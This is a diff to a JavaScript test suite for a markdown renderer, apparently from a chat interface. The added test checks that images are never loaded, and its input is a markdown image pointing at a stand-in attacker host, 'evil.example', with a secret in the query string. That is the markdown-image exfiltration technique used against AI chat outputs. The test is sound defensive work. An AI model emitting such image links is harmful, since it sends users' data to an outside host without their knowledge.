@@ -65,6 +65,11 @@ describe('renderMarkdown', () => {
     expect(out).not.toContain('href="javascript:')
     expect(out).toContain('<a href="https://example.com" target="_blank" rel="noopener noreferrer">')
   })
+  it('never loads an image: an image URL could carry data out the moment the chat opens', () => {
+    const out = renderMarkdown('![x](https://evil.example/p?d=SECRET)')
+    expect(out).not.toContain('<img')
+    expect(out).toContain('!<a href="https://evil.example/p?d=SECRET" target="_blank"')
+  })
   it('renders code fences', () => {
     expect(renderMarkdown('```ts\nconst a = 1\n```')).toContain('<pre><code class="language-ts">')
   })
